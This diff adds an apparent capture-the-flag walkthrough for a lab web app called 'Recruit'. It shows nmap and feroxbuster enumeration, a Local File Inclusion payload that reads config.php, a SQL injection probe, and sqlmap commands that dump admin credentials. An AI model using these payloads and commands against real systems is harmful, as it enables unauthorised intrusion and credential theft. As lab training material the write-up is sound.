@@ -1,0 +1,210 @@
+# Recruit - Walkthrough
+
+**Target IP:** `10.49.129.85`
+
+## 1. Initial Enumeration
+
+Since the target IP address was already provided, I began by performing an Nmap scan to identify the exposed services.
+
+```bash
+nmap -sC -sV 10.49.129.85
+```
+
+### Scan Results
+
+```text
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+53/tcp open  domain  ISC BIND 9.16.1
+80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
+```
+
+The scan revealed three open services:
+
+* **SSH (22)**
+* **DNS (53)**
+* **HTTP (80)**
+
+The HTTP service appeared to be the most promising attack surface, so I proceeded with web enumeration.
+
+---
+
+# 2. Web Enumeration
+
+After browsing to the web application on port **80**, I noticed that candidate CVs could be accessed through the application's API.
+
+To discover additional hidden resources, I performed directory enumeration using **Feroxbuster**.
+
+```bash
+feroxbuster -u http://10.49.129.85
+```
+
+During enumeration, I discovered the following file:
+
+```
+http://10.49.129.85/mail/mail.log
+```
+
+The log file contained sensitive deployment information.
+
+```text
+As discussed during deployment:
+
+HR login credentials (username: hr)
+are currently stored in the application
+configuration file (config.php).
+$HR_PASSWORD = 'hrpassword123';
+
+```
+
+The email indicated that the credentials were stored inside **config.php**, suggesting the possibility of reading the file through a Local File Inclusion (LFI) vulnerability.
+
+---
+
+# 3. Exploiting Local File Inclusion (LFI)
+
+The application was vulnerable to Local File Inclusion, allowing arbitrary local files to be read.
+
+Payload:
+
+```
+http://10.49.129.85/file.php?cv=file:///var/www/html/config.php
+```
+
+This revealed the following credentials:
+
+```
+Username: hr
+Password: hrpassword123
+```
+
+Using these credentials, I successfully authenticated as the **HR user**.
+
+---
+
+# 4. SQL Injection Discovery
+
+After logging into the HR dashboard, I found a search functionality.
+
+Testing the parameter with a single quotation mark produced a database error:
+
+```
+http://10.49.129.85/dashboard.php?search='
+```
+
+This behavior strongly suggested a SQL Injection vulnerability.
+
+---
+
+# 5. SQL Injection Exploitation
+
+I intercepted the request using **Burp Suite** and saved it as `req.txt`.
+
+I then automated the exploitation using **sqlmap**.
+
+### Enumerate Databases
+
+```bash
+sqlmap -r req.txt --dbs
+```
+
+The injection was confirmed as:
+
+* Boolean-based Blind SQL Injection
+* UNION-based SQL Injection
+
+Database enumeration revealed:
+
+```text
+available databases:
+
+information_schema
+mysql
+performance_schema
+phpmyadmin
+recruit_db
+sys
+```
+
+---
+
+# 6. Enumerating Tables
+
+Next, I enumerated the tables inside the **recruit_db** database.
+
+```bash
+sqlmap -r req.txt -D recruit_db --tables
+```
+
+Result:
+
+```text
+Database: recruit_db
+
+Tables
+
+candidates
+users
+```
+
+---
+
+# 7. Dumping User Credentials
+
+The **users** table looked particularly interesting, so I dumped its contents.
+
+```bash
+sqlmap -r req.txt -D recruit_db -T users --dump
+```
+
+Output:
+
+```text
++----+----------------+----------+
+| id | password       | username |
++----+----------------+----------+
+| 1  | admin@001admin | admin    |
++----+----------------+----------+
+```
+
+The database contained valid administrator credentials.
+
+```
+Username: admin
+Password: admin@001admin
+```
+
+---
+
+# 8. Administrator Access
+
+Using the credentials obtained through SQL Injection, I successfully logged into the application as the **Administrator**.
+
+At this stage, administrative access to the Recruit application was achieved.
+
+---
+
+# Attack Chain Summary
+
+1. Performed Nmap service enumeration.
+2. Enumerated the web application using Feroxbuster.
+3. Discovered `mail.log` containing deployment information.
+4. Exploited a Local File Inclusion (LFI) vulnerability to read `config.php`.
+5. Retrieved HR credentials.
+6. Logged in as the HR user.
+7. Identified a SQL Injection vulnerability in the search parameter.
+8. Used sqlmap to enumerate the database.
+9. Dumped the `users` table.
+10. Retrieved administrator credentials.
+11. Successfully authenticated as the administrator.
+
+---
+
+# Vulnerabilities Identified
+
+* Sensitive information disclosure (`mail.log`)
+* Local File Inclusion (LFI)
+* Hardcoded credentials
+* SQL Injection
+* Weak credential management
+
+These vulnerabilities chained together allowed complete compromise of the application's administrative functionality.
